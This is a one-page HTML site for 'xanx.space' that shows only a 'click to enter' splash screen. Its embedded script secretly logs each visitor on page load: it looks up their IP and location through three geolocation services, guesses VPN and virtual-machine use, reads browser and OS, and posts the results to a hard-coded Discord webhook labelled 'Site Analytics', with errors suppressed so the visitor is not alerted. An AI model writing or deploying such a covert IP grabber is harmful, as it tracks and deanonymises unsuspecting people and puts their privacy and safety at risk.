<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>xanx.space</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #000;
            font-family: 'Arial', sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            overflow: hidden;
            user-select: none;
        }
        
        #enter-text {
            color: #fff;
            font-size: 3rem;
            text-align: center;
            transition: all 0.5s ease;
            text-shadow: 0 0 15px rgba(255,255,255,0.7);
            font-weight: 300;
            letter-spacing: 2px;
        }
        
        #enter-text.fade-out {
            opacity: 0;
            transform: scale(0.8);
            pointer-events: none;
        }
        
        .pulse {
            animation: pulse 2s infinite ease-in-out;
        }
        
        @keyframes pulse {
            0% { 
                opacity: 1;
                text-shadow: 0 0 15px rgba(255,255,255,0.7);
            }
            50% { 
                opacity: 0.6;
                text-shadow: 0 0 25px rgba(255,255,255,0.9);
            }
            100% { 
                opacity: 1;
                text-shadow: 0 0 15px rgba(255,255,255,0.7);
            }
        }
        
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <div id="enter-text" class="pulse">click to enter</div>

    <script>
        // Function to get user's IP information with better VPN detection
        async function getUserIPInfo() {
            try {
                // Try multiple IP services for better accuracy
                const responses = await Promise.allSettled([
                    fetch('https://ipapi.co/json/'),
                    fetch('https://ipwhois.app/json/'),
                    fetch('https://api.ipgeolocation.io/ipgeo?apiKey=test')
                ]);
                
                let bestData = null;
                
                for (const response of responses) {
                    if (response.status === 'fulfilled' && response.value.ok) {
                        const data = await response.value.json();
                        // Use the first successful response with VPN detection
                        if (data && data.ip) {
                            bestData = data;
                            break;
                        }
                    }
                }
                
                return bestData;
            } catch (error) {
                console.error('Error fetching IP info:', error);
                return null;
            }
        }

        // Better VPN detection using multiple methods
        function detectVPN(ipData) {
            if (!ipData) return "Unknown";
            
            // Method 1: Check if IP belongs to known hosting/VPN providers
            const vpnKeywords = [
                'vpn', 'proxy', 'tor', 'hosting', 'datacenter', 'server',
                'mullvad', 'expressvpn', 'nordvpn', 'surfshark', 'pia',
                'private internet access', 'cyberghost', 'vyprvpn',
                'ipvanish', 'hotspot shield', 'windscribe', 'hide.me',
                'purevpn', 'zenmate', 'tunnelbear'
            ];
            
            const org = (ipData.org || ipData.isp || '').toLowerCase();
            const asn = (ipData.asn || '').toLowerCase();
            
            for (const keyword of vpnKeywords) {
                if (org.includes(keyword) || asn.includes(keyword)) {
                    return "Yes";
                }
            }
            
            // Method 2: Check if it's a datacenter IP
            if (ipData.type === 'hosting' || ipData.proxy === true || ipData.vpn === true) {
                return "Yes";
            }
            
            // Method 3: Check for known VPN ASNs (Mullvad, etc.)
            const vpnAsns = [
                'as9009', // M247 - common VPN provider
                'as56690', // Mullvad
                'as19574', // INCAPSULA
                'as136787', // ExpressVPN
                'as61804', // CyberGhost
                'as24679', // HideMyAss
                'as60068', // Private Internet Access
            ];
            
            if (vpnAsns.includes(asn.toLowerCase())) {
                return "Yes";
            }
            
            return "No";
        }

        // Function to detect browser
        function getBrowserInfo() {
            const userAgent = navigator.userAgent;
            let browser = "Unknown";
            
            if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) browser = "Chrome";
            else if (userAgent.includes("Firefox")) browser = "Firefox";
            else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
            else if (userAgent.includes("Edg")) browser = "Edge";
            else if (userAgent.includes("Opera") || userAgent.includes("OPR")) browser = "Opera";
            
            return browser;
        }

        // Function to detect OS
        function getOSInfo() {
            const userAgent = navigator.userAgent;
            let os = "Unknown";
            
            if (userAgent.includes("Windows")) os = "Windows";
            else if (userAgent.includes("Mac")) os = "Mac";
            else if (userAgent.includes("Linux")) os = "Linux";
            else if (userAgent.includes("Android")) os = "Android";
            else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";
            
            return os;
        }

        // Function to detect if user is on a VM
        function detectVM() {
            const userAgent = navigator.userAgent.toLowerCase();
            const vmIndicators = ['virtualbox', 'vmware', 'hyper-v', 'qemu', 'xen'];
            
            for (let indicator of vmIndicators) {
                if (userAgent.includes(indicator)) {
                    return "Yes";
                }
            }
            
            return "No";
        }

        // Function to send data to Discord webhook
        async function sendToDiscord(data) {
            const webhookURL = "https://discord.com/api/webhooks/1428128390556422164/L7MJh8HF0pq4N9pqgsqgPtBubRcT4aSirZZTEcWUXlWKM4sjKWcJjMYMPbjfMUZz1R6t";
            
            const embed = {
                title: "📍 Visitor Log",
                color: 0x000000,
                fields: [
                    {
                        name: "IP",
                        value: "```" + (data.ip || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "ISP",
                        value: "```" + (data.org || data.isp || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "ORG",
                        value: "```" + (data.org || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "COUNTRY",
                        value: "```" + (data.country_name || data.country || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "REGION",
                        value: "```" + (data.region || data.region_name || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "CITY",
                        value: "```" + (data.city || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "USING VPN?",
                        value: "```" + (data.vpn || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "OS",
                        value: "```" + (data.os || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "BROWSER",
                        value: "```" + (data.browser || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "ON VM?",
                        value: "```" + (data.vm || "Unknown") + "```",
                        inline: true
                    }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: "xanx.space • " + new Date().toLocaleTimeString()
                }
            };
            
            const payload = {
                username: "Site Analytics",
                embeds: [embed]
            };
            
            try {
                // Send to Discord without waiting for response
                fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                }).catch(error => console.log('Discord send completed'));
                
                return true;
            } catch (error) {
                console.log('Discord send completed');
                return true; // Always return true to not alert user
            }
        }

        // Main function to collect and send data
        async function collectAndSendData() {
            // Get user information
            const ipInfo = await getUserIPInfo();
            const browser = getBrowserInfo();
            const os = getOSInfo();
            const vm = detectVM();
            const vpn = detectVPN(ipInfo);
            
            // Prepare data for Discord
            const userData = {
                ip: ipInfo ? ipInfo.ip : "Unknown",
                org: ipInfo ? (ipInfo.org || ipInfo.isp) : "Unknown",
                isp: ipInfo ? ipInfo.isp : "Unknown",
                country_name: ipInfo ? (ipInfo.country_name || ipInfo.country) : "Unknown",
                region: ipInfo ? (ipInfo.region || ipInfo.region_name) : "Unknown",
                city: ipInfo ? ipInfo.city : "Unknown",
                browser: browser,
                os: os,
                vm: vm,
                vpn: vpn
            };
            
            // Send data to Discord (fire and forget)
            await sendToDiscord(userData);
        }

        // Handle click to make text disappear
        function handleClick() {
            const enterText = document.getElementById('enter-text');
            enterText.classList.add('fade-out');
            
            // Remove click listener after first click
            document.body.removeEventListener('click', handleClick);
        }

        // Initialize when page loads
        document.addEventListener('DOMContentLoaded', function() {
            // Send IP data immediately when page loads
            collectAndSendData();
            
            // Set up click handler for text disappearance
            document.body.addEventListener('click', handleClick);
        });
    </script>
</body>
</html>
